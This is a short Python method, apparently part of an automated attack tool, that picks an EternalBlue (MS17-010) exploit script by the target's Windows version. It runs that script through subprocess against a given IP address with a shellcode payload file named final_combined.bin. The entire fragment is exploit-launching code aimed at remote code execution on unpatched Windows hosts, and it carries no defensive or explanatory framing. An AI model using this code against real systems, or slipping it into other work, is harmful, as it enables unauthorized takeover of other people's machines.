def exploit_single(self, ip, operating_system):
        """
            Exploits a single ip, exploit is based on the given operating system.
        """
        result = None
        if "Windows Server 2008" in operating_system or "Windows 7" in operating_system:
            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit7.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif "Windows Server 2012" in operating_system or "Windows 10" in operating_system or "Windows 8.1" in operating_system:
            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit8.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            return ["System target could not be automatically identified"]
        return result.stdout.decode('utf-8').split('\n')